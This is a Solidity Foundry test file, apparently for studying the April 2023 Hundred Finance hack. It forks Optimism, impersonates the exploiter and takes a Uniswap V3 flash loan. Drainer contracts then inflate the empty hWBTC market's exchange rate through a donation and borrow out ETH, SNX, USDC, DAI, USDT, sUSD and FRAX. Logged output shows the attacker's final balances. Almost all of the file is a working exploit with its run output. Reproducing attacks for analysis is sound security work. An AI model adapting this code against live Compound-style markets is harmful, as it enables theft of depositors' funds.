// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/src/Test.sol";
import "./interface.sol";

// Compound理解
// 

// @Analysis
// https://twitter.com/peckshield/status/1647307128267476992
// https://twitter.com/danielvf/status/1647329491788677121
// https://twitter.com/hexagate_/status/1647334970258608131
// @TX
// https://optimistic.etherscan.io/tx/0x6e9ebcdebbabda04fa9f2e3bc21ea8b2e4fb4bf4f4670cb8483e2f0b2604f451
// @Summary
// https://blog.hundred.finance/15-04-23-hundred-finance-hack-post-mortem-d895b618cf33

// 可参考 dForce_exp
interface IChainlinkPriceOracleProxy {
    function getUnderlyingPrice(address cToken) external view returns (uint);
}

//  uniswap v2
interface IUniswapV2Callee {
    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external;
}
interface IPancakeCallee {
    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

// velodrome
interface IPoolCallee {
    function hook(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external;
}
//velodrome info
// https://velodrome.finance/security#contracts
// sAMMV2-WBTC/tBTC : 0x6e57B9E54ea043a829584B22182ad22bF446926C


// uniV3
// WBTC 相关的pool 信息
// https://app.uniswap.org/explore/tokens/ethereum/0x2260fac5e5542a773aa44fbcfedf7c193bc2c599
// ETH / WBTC   0x85C31FFA3706d1cce9d525a00f1C7D4A2911754c
interface uniswapV3Flash {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

//Beethoven X DEX (balancer powered)
//https://beets.fi/
//https://docs.beets.fi/technicals/deployments
// valut：0xBA12222222228d8Ba445958a75a0704d566BF2C8



contract contractTest is Test {
    IERC20 WBTC = IERC20(0x68f180fcCe6836688e9084f035309E29Bf0A2095);
    IERC20 USDC = IERC20(0x7F5c764cBc14f9669B88837ca1490cCa17c31607);
    IERC20 SNX = IERC20(0x8700dAec35aF8Ff88c16BdF0418774CB3D7599B4);
    IERC20 sUSD = IERC20(0x8c6f28f2F1A3C87F0f938b96d27520d9751ec8d9);
    IERC20 USDT = IERC20(0x94b008aA00579c1307B0EF2c499aD98a8ce58e58);
    IERC20 DAI = IERC20(0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1);
    ICErc20Delegate hWBTC = ICErc20Delegate(0x35594E4992DFefcB0C20EC487d7af22a30bDec60);
    crETH CEther = crETH(0x1A61A72F5Cf5e857f15ee502210b81f8B3a66263);
    ICErc20Delegate hSNX = ICErc20Delegate(0x371cb7683bA0639A21f31E0B20F705e45bC18896);
    ICErc20Delegate hUSDC = ICErc20Delegate(0x10E08556D6FdD62A9CE5B3a5b07B0d8b0D093164);
    ICErc20Delegate hDAI = ICErc20Delegate(0x0145BE461a112c60c12c34d5Bc538d10670E99Ab);
    ICErc20Delegate hUSDT = ICErc20Delegate(0xb994B84bD13f7c8dD3af5BEe9dfAc68436DCF5BD);
    ICErc20Delegate hSUSD = ICErc20Delegate(0x76E47710AEe13581Ba5B19323325cA31c48d4cC3);
    ICErc20Delegate hFRAX = ICErc20Delegate(0xd97a2591930E2Da927b1903BAA6763618BD7425b);
    IUnitroller unitroller = IUnitroller(0x5a5755E1916F547D04eF43176d4cbe0de4503d5d);
    IAaveFlashloan aaveV3 = IAaveFlashloan(0x794a61358D6845594F94dc1DB02A252b5b4814aD);
    address HundredFinanceExploiter = 0x155DA45D374A286d383839b1eF27567A15E67528;
    IChainlinkPriceOracleProxy priceOracle = IChainlinkPriceOracleProxy(0x10010069DE6bD5408A6dEd075Cf6ae2498073c73);

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("https://mainnet.optimism.io", 90_760_765);
        cheats.label(address(WBTC), "WBTC");
        cheats.label(address(USDC), "USDC");
        cheats.label(address(SNX), "SNX");
        cheats.label(address(sUSD), "sUSD");
        cheats.label(address(USDT), "USDT");
        cheats.label(address(DAI), "DAI");
        cheats.label(address(hWBTC), "hWBTC");
        cheats.label(address(CEther), "CEther");
        cheats.label(address(hSNX), "hSNX");
        cheats.label(address(hUSDC), "hUSDC");
        cheats.label(address(hDAI), "hDAI");
        cheats.label(address(hUSDT), "hUSDT");
        cheats.label(address(hSUSD), "hSUSD");
        cheats.label(address(hFRAX), "hFRAX");
        cheats.label(address(aaveV3), "aaveV3");
        cheats.label(address(unitroller), "unitroller");
        cheats.label(address(priceOracle), "ChainlinkPriceOracleProxy");
    }

    function testExploit() external {
        // payable(address(0)).transfer(address(this).balance);
        emit log_named_uint("ETH Balance not sending to blackHole", address(this).balance);
        cheats.startPrank(HundredFinanceExploiter);
        hWBTC.transfer(address(this), 1_503_167_295); // anti front-run
        cheats.stopPrank();

        //aaveV3
        // 为啥要借500WBTC，50，100，200不行么？？
        //aaveV3.flashLoanSimple(address(this), address(WBTC), 500 * 1e8, new bytes(0), 0);

        //velodrome， 类似uniswap v2 
        // 漏洞被攻击时，该pair还未创建
        // getVelodromeLoan(address(WBTC), 5*1e8, 0x6e57B9E54ea043a829584B22182ad22bF446926C);

        // 如果一个池子不够，如何串联多个池子发起多笔闪电贷呢？
        //uniswap v3
        getUniv3Loan();

        //other compound V2

        //other compound V3

        //balancer

        //curve


        emit log_named_decimal_uint("Attacker ETH balance after exploit", address(this).balance, 18);
        emit log_named_decimal_uint("Attacker USDC balance after exploit", USDC.balanceOf(address(this)), USDC.decimals());
        emit log_named_decimal_uint("Attacker SNX balance after exploit", SNX.balanceOf(address(this)), SNX.decimals());
        emit log_named_decimal_uint("Attacker sUSD balance after exploit", sUSD.balanceOf(address(this)), sUSD.decimals());
        emit log_named_decimal_uint("Attacker USDT balance after exploit", USDT.balanceOf(address(this)), USDT.decimals());
        emit log_named_decimal_uint("Attacker DAI balance after exploit", DAI.balanceOf(address(this)), DAI.decimals());
    }

    //************************************************
    //   Velodrome 闪电贷相关
    //************************************************
    function getVelodromeLoan(address tokenBorrow, uint256 amount, address pair) internal {
        require(pair != address(0), "!pair");

        address token0 = IPool(pair).token0();
        address token1 = IPool(pair).token1();
        uint256 amount0Out = tokenBorrow == token0 ? amount : 0;
        uint256 amount1Out = tokenBorrow == token1 ? amount : 0;

        // need to pass some data to trigger uniswapV2Call
        bytes memory data = abi.encode(tokenBorrow, amount, pair);
        IPool(pair).swap(amount0Out, amount1Out, address(this), data);
    }

    function hook(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata _data
    ) external {
        (address tokenBorrow, uint256 amount, address pair) = abi.decode(_data, (address, uint256, address));
        // about 0.3%
        uint256 fee = ((amount * 3) / 997) + 1;
        uint256 repayAmount = amount + fee;

        hWBTC.redeem(hWBTC.balanceOf(address(this)));

        console.log("1. ETH Drain \r");
        ETHDrains();
        console.log("2. SNX Drain \r");
        tokenDrains(hSNX);
        console.log("3. USDC Drain \r");
        tokenDrains(hUSDC);
        console.log("4. DAI Drain \r");
        tokenDrains(hDAI);
        console.log("5. USDT Drain");
        tokenDrains(hUSDT);
        console.log("6. SUSD Drain");
        tokenDrains(hSUSD);
        console.log("7. FRAX Drain \r");
        tokenDrains(hFRAX);

        IERC20(tokenBorrow).transfer(pair, repayAmount);

    }



    //************************************************
    //   Uniswap V3 闪电贷相关
    //************************************************
    function getUniv3Loan()internal{
        // ETH / WBTC pool address: 0x85C31FFA3706d1cce9d525a00f1C7D4A2911754c
        address univ3Pair = 0x85C31FFA3706d1cce9d525a00f1C7D4A2911754c;
        uint256 borrowAmount = 80 * 1e8;
        bytes memory data = abi.encode(borrowAmount);
        uniswapV3Flash(univ3Pair).flash(address(this), 0, borrowAmount, data);
    }

    function uniswapV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
        hWBTC.redeem(hWBTC.balanceOf(address(this)));

        console.log("1. ETH Drain \r");
        ETHDrains();
        console.log("2. SNX Drain \r");
        tokenDrains(hSNX);
        console.log("3. USDC Drain \r");
        tokenDrains(hUSDC);
        console.log("4. DAI Drain \r");
        tokenDrains(hDAI);
        console.log("5. USDT Drain");
        tokenDrains(hUSDT);
        console.log("6. SUSD Drain");
        tokenDrains(hSUSD);
        console.log("7. FRAX Drain \r");
        tokenDrains(hFRAX);

        uint256 borrowAmount = abi.decode(data, (uint256));
        WBTC.transfer(0x85C31FFA3706d1cce9d525a00f1C7D4A2911754c, borrowAmount + fee1);
    }

    //************************************************
    //   aave V3 闪电贷相关
    //************************************************
    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initator,
        bytes calldata params
    ) external payable returns (bool) {
        hWBTC.redeem(hWBTC.balanceOf(address(this)));

        console.log("1. ETH Drain \r");
        ETHDrains();
        console.log("2. SNX Drain \r");
        tokenDrains(hSNX);
        console.log("3. USDC Drain \r");
        tokenDrains(hUSDC);
        console.log("4. DAI Drain \r");
        tokenDrains(hDAI);
        console.log("5. USDT Drain");
        tokenDrains(hUSDT);
        console.log("6. SUSD Drain");
        tokenDrains(hSUSD);
        console.log("7. FRAX Drain \r");
        tokenDrains(hFRAX);

        WBTC.approve(address(aaveV3), type(uint256).max);
        return true;
    }

    
    //************************************************
    //   共用函数
    //************************************************
    function ETHDrains() internal {
        uint256 _salt = uint256(keccak256(abi.encodePacked(uint256(0))));
        bytes memory creationBytecode = getETHDrainCreationBytecode(address(CEther));
        address DrainAddress = getAddress(creationBytecode, _salt);
        WBTC.transfer(DrainAddress, WBTC.balanceOf(address(this)));

        ETHDrain ETHDrainer = new ETHDrain{salt: bytes32(_salt)}(CEther);
        uint256 liquidationRepayAmount = getLiquidationRepayAmount(address(CEther));
        uint256 result = unitroller.liquidateBorrowAllowed(address(CEther), address(hWBTC), address(this), address(ETHDrainer), liquidationRepayAmount);
        console.log("liquidateBorrowAllowed result:", result);
        CEther.liquidateBorrow{value: liquidationRepayAmount}(address(ETHDrainer), address(hWBTC)); 
        hWBTC.redeem(1); // Withdraw remaining share from hWBTC
        console.log("*************************************************");
        console.log("\r");
    }

    function tokenDrains(ICErc20Delegate hToken) internal {
        uint256 _salt = uint256(keccak256(abi.encodePacked(uint256(0))));
        bytes memory creationBytecode = gettokenDrainCreationBytecode(address(hToken));
        address DrainAddress = getAddress(creationBytecode, _salt);
        WBTC.transfer(DrainAddress, WBTC.balanceOf(address(this)));

        tokenDrain tokenDrainer = new tokenDrain{salt: bytes32(_salt)}(hToken);
        IERC20 underlyingToken = IERC20(hToken.underlying());
        underlyingToken.approve(address(hToken), type(uint256).max);
        uint256 result = hToken.liquidateBorrow(address(tokenDrainer), getLiquidationRepayAmount(address(hToken)), address(hWBTC));
        hWBTC.redeem(1); // Withdraw remaining share from hWBTC
        console.log("*************************************************");
        console.log("\r");
    }

    function getLiquidationRepayAmount(address hToken) public view returns (uint256) {
        uint256 exchangeRate = hWBTC.exchangeRateStored();
        uint256 liquidationIncentiveMantissa = 1080000000000000000;
        uint256 priceBorrowedMantissa = priceOracle.getUnderlyingPrice(address(hToken));
        uint256 priceCollateralMantissa = priceOracle.getUnderlyingPrice(address(hWBTC));
        uint256 hTokenAmount = 1;
        uint256 liquidateAmount = 1e18/(priceBorrowedMantissa * liquidationIncentiveMantissa / (exchangeRate * hTokenAmount * priceCollateralMantissa / 1e18)) + 1;
        return liquidateAmount;
    }

    function getETHDrainCreationBytecode(address token) public pure returns (bytes memory) {
        bytes memory bytecode = type(ETHDrain).creationCode;
        return abi.encodePacked(bytecode, abi.encode(token));
    }

    function gettokenDrainCreationBytecode(address token) public pure returns (bytes memory) {
        bytes memory bytecode = type(tokenDrain).creationCode;
        return abi.encodePacked(bytecode, abi.encode(token));
    }

    function getAddress(bytes memory bytecode, uint256 _salt) public view returns (address) {
        bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), _salt, keccak256(bytecode)));
        return address(uint160(uint256(hash)));
    }

    receive() external payable {}
}

contract ETHDrain is Test {
    IERC20 WBTC = IERC20(0x68f180fcCe6836688e9084f035309E29Bf0A2095);
    ICErc20Delegate hWBTC = ICErc20Delegate(0x35594E4992DFefcB0C20EC487d7af22a30bDec60);
    IUnitroller unitroller = IUnitroller(0x5a5755E1916F547D04eF43176d4cbe0de4503d5d);
    crETH CEtherDelegate;

    constructor(crETH Delegate) payable {
        console.log("First step, Deposit a small amount of WBTC to the empty hWBTC pool to obtain shares");
        CEtherDelegate = Delegate;
        WBTC.approve(address(hWBTC), type(uint256).max);
        hWBTC.mint(4 * 1e8);
        hWBTC.redeem(hWBTC.totalSupply() - 2); // completing the initial deposit, the shares of hWBTC and the amount of WBTC in hWBTC are at a minimum
        console2.log("ETHDrain's share in hWBTC:", hWBTC.balanceOf(address(this)), "the WBTC amount in hWBTC:",WBTC.balanceOf(address(hWBTC)));
        console2.log( "hWBTC totalSupply:", hWBTC.totalSupply() );
        console.log("\r");

        console.log("Second step, Donate a large amount of WBTC to the hWBTC pool to increase the exchangeRate(the number of WBTC represented by each share)");
        (,,, uint256 exchangeRate_1) = hWBTC.getAccountSnapshot(address(this));
        console.log("exchangeRate before manipulation:", exchangeRate_1);
        uint256 donationAmount = WBTC.balanceOf(address(this));
        WBTC.transfer(address(hWBTC), donationAmount); // "donation" exchangeRate manipulation
        uint256 WBTCAmountInhWBTC = WBTC.balanceOf(address(hWBTC));
        (,,, uint256 exchangeRate_2) = hWBTC.getAccountSnapshot(address(this));
        console.log("exchangeRate after manipulation:", exchangeRate_2);
        console.log("\r");

        console.log("Third setp, Lend tokens from the hEther pool and send to exploiter");
        address[] memory cTokens = new address[](1);
        cTokens[0] = address(hWBTC);
        unitroller.enterMarkets(cTokens);
        uint256 borrowAmount = CEtherDelegate.getCash() - 1;
        CEtherDelegate.borrow(borrowAmount);
        payable(address(msg.sender)).transfer(address(this).balance);
        console.log("\r");

        console.log("Fouth step, redeem WBTC from the hWBTC pool");
        uint256 redeemAmount = donationAmount - 1;
        console.log("Calculate the amount of shares represented by the redeem amount:", redeemAmount * hWBTC.totalSupply() / WBTCAmountInhWBTC);
        console.log("another way of calculating, redeemAmount * 1e18 / exchangeRate:", redeemAmount * 1e18 / exchangeRate_2);
        console.log("Due to the inflation attack, the attacker redeems all previously donated WBTC with a calculated share of:", redeemAmount * hWBTC.totalSupply() / WBTCAmountInhWBTC);
        hWBTC.redeemUnderlying(redeemAmount);
        console2.log("after redeem the ETHDrain's share in hWBTC:", hWBTC.balanceOf(address(this)), "the WBTC amount in hWBTC:", WBTC.balanceOf(address(hWBTC)));
        console.log("\r");

        console.log("Firth step, send WBTC to exploiter");
        WBTC.transfer(msg.sender, WBTC.balanceOf(address(this)));
        console.log("\r");
    }

    receive() external payable {}
}

contract tokenDrain is Test {
    IERC20 WBTC = IERC20(0x68f180fcCe6836688e9084f035309E29Bf0A2095);
    ICErc20Delegate hWBTC = ICErc20Delegate(0x35594E4992DFefcB0C20EC487d7af22a30bDec60);
    IUnitroller unitroller = IUnitroller(0x5a5755E1916F547D04eF43176d4cbe0de4503d5d);
    ICErc20Delegate CErc20Delegate;

    constructor(ICErc20Delegate Delegate) payable {
        console.log("First step, Deposit a small amount of WBTC to the empty hWBTC pool to obtain shares");
        CErc20Delegate = Delegate;
        WBTC.approve(address(hWBTC), type(uint256).max);
        hWBTC.mint(4 * 1e8);
        hWBTC.redeem(hWBTC.totalSupply() - 2); // completing the initial deposit, the shares of hWBTC and the amount of WBTC in hWBTC are at a minimum
        console2.log("toeknDrain's share in hWBTC:", hWBTC.balanceOf(address(this)), "the WBTC amount in hWBTC:", WBTC.balanceOf(address(hWBTC)));
        console.log("\r");

        console.log("Second step, Donate a large amount of WBTC to the hWBTC pool to increase the exchangeRate(the number of WBTC represented by each share)");
        (,,, uint256 exchangeRate_1) = hWBTC.getAccountSnapshot(address(this));
        console.log("exchangeRate before manipulation:", exchangeRate_1);
        uint256 donationAmount = WBTC.balanceOf(address(this));
        WBTC.transfer(address(hWBTC), donationAmount); // "donation" exchangeRate manipulation
        uint256 WBTCAmountInhWBTC = WBTC.balanceOf(address(hWBTC));
        (,,, uint256 exchangeRate_2) = hWBTC.getAccountSnapshot(address(this));
        console.log("exchangeRate after manipulation:", exchangeRate_2);
        console.log("\r");

        console.log("Third setp, Lend tokens from the hToken pool and send to exploiter");
        address[] memory cTokens = new address[](1);
        cTokens[0] = address(hWBTC);
        unitroller.enterMarkets(cTokens);
        uint256 borrowAmount = CErc20Delegate.getCash() - 1;
        CErc20Delegate.borrow(borrowAmount);
        IERC20 underlyingToken = IERC20(CErc20Delegate.underlying());
        underlyingToken.transfer(msg.sender, borrowAmount); // borrow token and send to exploiter
        console.log("\r");

        console.log("Fouth step, redeem WBTC from the hWBTC pool");
        uint256 redeemAmount = donationAmount;
        console.log("Calculate the amount of shares represented by the redeem amount:", redeemAmount * hWBTC.totalSupply() / WBTCAmountInhWBTC);
        console.log("another way of calculating, redeemAmount * 1e18 / exchangeRate:", redeemAmount * 1e18 / exchangeRate_2);
        console.log("Due to the inflation attack, the attacker redeems all previously donated WBTC with a calculated share of:", redeemAmount * hWBTC.totalSupply() / WBTCAmountInhWBTC);
        hWBTC.redeemUnderlying(redeemAmount);
        console2.log("after redeem the toeknDrain's share in hWBTC:", hWBTC.balanceOf(address(this)),"the WBTC amount in hWBT:C", WBTC.balanceOf(address(hWBTC)));
        console.log("\r");

        console.log("Firth step, send WBTC to exploiter");
        WBTC.transfer(msg.sender, WBTC.balanceOf(address(this)));
        console.log("\r");
    }
}





/*
1. ETH Drain 
  First step, Deposit a small amount of WBTC to the empty hWBTC pool to obtain shares
  ETHDrain's share in hWBTC: 2 the WBTC amount in hWBTC: 378
  
  Second step, Donate a large amount of WBTC to the hWBTC pool to increase the exchangeRate(the number of WBTC represented by each share)
  exchangeRate before manipulation: 500000000000000000
  exchangeRate after manipulation: 25015031908500000000000000000
  
  Third setp, Lend tokens from the hEther pool and send to exploiter
  
  Fouth step, redeem WBTC from the hWBTC pool
  Calculate the amount of shares represented by the redeem amount: 1
  another way of calculating, redeemAmount * 1e18 / exchangeRate: 1
  Due to the inflation attack, the attacker redeems all previously donated WBTC with a calculated share of: 1
  after redeem the ETHDrain's share in hWBTC: 1 the WBTC amount in hWBTC: 379
  
  Firth step, send WBTC to exploiter
  
  *************************************************
  
  2. SNX Drain 
  First step, Deposit a small amount of WBTC to the empty hWBTC pool to obtain shares
  toeknDrain's share in hWBTC: 2 the WBTC amount in hWBTC: 378
  
  Second step, Donate a large amount of WBTC to the hWBTC pool to increase the exchangeRate(the number of WBTC represented by each share)
  exchangeRate before manipulation: 500000000000000000
  exchangeRate after manipulation: 25015031908500000000000000000
  
  Third setp, Lend tokens from the hToken pool and send to exploiter
  
  Fouth step, redeem WBTC from the hWBTC pool
  Calculate the amount of shares represented by the redeem amount: 1
  another way of calculating, redeemAmount * 1e18 / exchangeRate: 1
  Due to the inflation attack, the attacker redeems all previously donated WBTC with a calculated share of: 1
  after redeem the toeknDrain's share in hWBTC: 1 the WBTC amount in hWBT:C 378
  
  Firth step, send WBTC to exploiter
  
  *************************************************
  
  3. USDC Drain 
  First step, Deposit a small amount of WBTC to the empty hWBTC pool to obtain shares
  toeknDrain's share in hWBTC: 2 the WBTC amount in hWBTC: 378
  
  Second step, Donate a large amount of WBTC to the hWBTC pool to increase the exchangeRate(the number of WBTC represented by each share)
  exchangeRate before manipulation: 500000000000000000
  exchangeRate after manipulation: 25015031908500000000000000000
  
  Third setp, Lend tokens from the hToken pool and send to exploiter
  
  Fouth step, redeem WBTC from the hWBTC pool
  Calculate the amount of shares represented by the redeem amount: 1
  another way of calculating, redeemAmount * 1e18 / exchangeRate: 1
  Due to the inflation attack, the attacker redeems all previously donated WBTC with a calculated share of: 1
  after redeem the toeknDrain's share in hWBTC: 1 the WBTC amount in hWBT:C 378
  
  Firth step, send WBTC to exploiter
  
  *************************************************
  
  4. DAI Drain 
  First step, Deposit a small amount of WBTC to the empty hWBTC pool to obtain shares
  toeknDrain's share in hWBTC: 2 the WBTC amount in hWBTC: 378
  
  Second step, Donate a large amount of WBTC to the hWBTC pool to increase the exchangeRate(the number of WBTC represented by each share)
  exchangeRate before manipulation: 500000000000000000
  exchangeRate after manipulation: 25015031908500000000000000000
  
  Third setp, Lend tokens from the hToken pool and send to exploiter
  
  Fouth step, redeem WBTC from the hWBTC pool
  Calculate the amount of shares represented by the redeem amount: 1
  another way of calculating, redeemAmount * 1e18 / exchangeRate: 1
  Due to the inflation attack, the attacker redeems all previously donated WBTC with a calculated share of: 1
  after redeem the toeknDrain's share in hWBTC: 1 the WBTC amount in hWBT:C 378
  
  Firth step, send WBTC to exploiter
  
  *************************************************
  
  5. USDT Drain
  First step, Deposit a small amount of WBTC to the empty hWBTC pool to obtain shares
  toeknDrain's share in hWBTC: 2 the WBTC amount in hWBTC: 378
  
  Second step, Donate a large amount of WBTC to the hWBTC pool to increase the exchangeRate(the number of WBTC represented by each share)
  exchangeRate before manipulation: 500000000000000000
  exchangeRate after manipulation: 25015031908500000000000000000
  
  Third setp, Lend tokens from the hToken pool and send to exploiter
  
  Fouth step, redeem WBTC from the hWBTC pool
  Calculate the amount of shares represented by the redeem amount: 1
  another way of calculating, redeemAmount * 1e18 / exchangeRate: 1
  Due to the inflation attack, the attacker redeems all previously donated WBTC with a calculated share of: 1
  after redeem the toeknDrain's share in hWBTC: 1 the WBTC amount in hWBT:C 378
  
  Firth step, send WBTC to exploiter
  
  *************************************************
  
  6. SUSD Drain
  First step, Deposit a small amount of WBTC to the empty hWBTC pool to obtain shares
  toeknDrain's share in hWBTC: 2 the WBTC amount in hWBTC: 378
  
  Second step, Donate a large amount of WBTC to the hWBTC pool to increase the exchangeRate(the number of WBTC represented by each share)
  exchangeRate before manipulation: 500000000000000000
  exchangeRate after manipulation: 25015031908500000000000000000
  
  Third setp, Lend tokens from the hToken pool and send to exploiter
  
  Fouth step, redeem WBTC from the hWBTC pool
  Calculate the amount of shares represented by the redeem amount: 1
  another way of calculating, redeemAmount * 1e18 / exchangeRate: 1
  Due to the inflation attack, the attacker redeems all previously donated WBTC with a calculated share of: 1
  after redeem the toeknDrain's share in hWBTC: 1 the WBTC amount in hWBT:C 378
  
  Firth step, send WBTC to exploiter
  
  *************************************************
  
  7. FRAX Drain 
  First step, Deposit a small amount of WBTC to the empty hWBTC pool to obtain shares
  toeknDrain's share in hWBTC: 2 the WBTC amount in hWBTC: 378
  
  Second step, Donate a large amount of WBTC to the hWBTC pool to increase the exchangeRate(the number of WBTC represented by each share)
  exchangeRate before manipulation: 500000000000000000
  exchangeRate after manipulation: 25015031908500000000000000000
  
  Third setp, Lend tokens from the hToken pool and send to exploiter
  
  Fouth step, redeem WBTC from the hWBTC pool
  Calculate the amount of shares represented by the redeem amount: 1
  another way of calculating, redeemAmount * 1e18 / exchangeRate: 1
  Due to the inflation attack, the attacker redeems all previously donated WBTC with a calculated share of: 1
  after redeem the toeknDrain's share in hWBTC: 1 the WBTC amount in hWBT:C 378
  
  Firth step, send WBTC to exploiter
  
  *************************************************
  
  Attacker ETH balance after exploit: 1021.915074224867122534
  Attacker USDC balance after exploit: 1233516.758493
  Attacker SNX balance after exploit: 20000.006040813679379832
  Attacker sUSD balance after exploit: 865142.911064170347497066
  Attacker USDT balance after exploit: 1113430.652678
  Attacker DAI balance after exploit: 842788.494009886029179569

  */